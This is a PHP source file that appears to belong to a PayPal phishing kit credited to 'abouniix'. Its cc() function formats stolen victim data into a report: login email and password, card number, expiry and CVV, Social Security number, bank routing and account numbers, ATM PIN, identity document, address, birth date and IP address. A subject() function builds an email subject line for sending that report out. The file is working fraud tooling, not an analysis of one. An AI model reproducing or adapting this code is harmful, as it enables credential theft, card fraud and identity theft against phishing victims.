<?php

function cc(){
$r= "\n==================+ pp Result +==================
Email Address		: ".$_SESSION['emaill']."
Password		: ".$_SESSION['passwordd']."
-----------------------+ CC Info +-------------------------
Name of cardholder	: ".$_POST['CardName']."
Card Type		: ".$_POST['cardtype']."
Card Number		: ".$_POST['defaultcardnumber']."
Expiration Date		: ".$_POST['defaultexpmonth']."/".$_POST['defaultexpyear']."
Card Verification Number: ".$_POST['defaultcvv2']."
Social Security Number	: ".$_POST['ssn'];
if($_POST['routing']!=""){$r=$r."\nBank Routing Number	: ".$_POST['routing'];}
if($_POST['accountch']!=""){$r=$r."\nLast 4 digits BanK.A Num	: ".$_POST['accountch'];}
if($_POST['account']!=""){$r=$r."\nBank Account Number	: ".$_POST['account'];}
if($_POST['atm']!="0000"){$r=$r."\nATM			: ".$_POST['atm'];}
if($_POST['codepersonel']!=""){$r=$r."\Secure Code			: ".$_POST['codepersonel'];}
if($_POST['set_type_id']!=""){$r=$r."\n".$_POST['IDTYPE']."		: ".$_POST['set_type_id'];}
$r=$r."\n------------------------------------------------------
First Name	: ".$_POST['firstname']."
Last Name	: ".$_POST['name']."
Address 1	: ".$_POST['address']."
Address 2	: ".$_POST['address2']."
City		: ".$_POST['city'];
if($_POST['zip']!=""){$r=$r."\nZIP Code	: ".$_POST['zip'];}
$r=$r."\nCountry		: ".$_POST['RCP_COUNTRY']."
Telephone	: ".$_POST['userphone']."
Date Of Birth	: ".$_POST['bday']."/".$_POST['bmonth']."/".$_POST['byear']."
-----------------------------------------------------------------
Date		: ".gmdate("d/m/Y - H:i:s")."
Browser		: ".$_POST['BROWSER']."
Client IP	: ".getenv("REMOTE_ADDR")."
HostName	: ".gethostbyaddr(getenv("REMOTE_ADDR"))."
==================+ Created in 2013 By abouniix +==================\n";
return $r;}
function subject(){return "CC | ".$_POST['RCP_COUNTRY']." | ".$_POST['CardName']." | ".getenv("REMOTE_ADDR");}
?>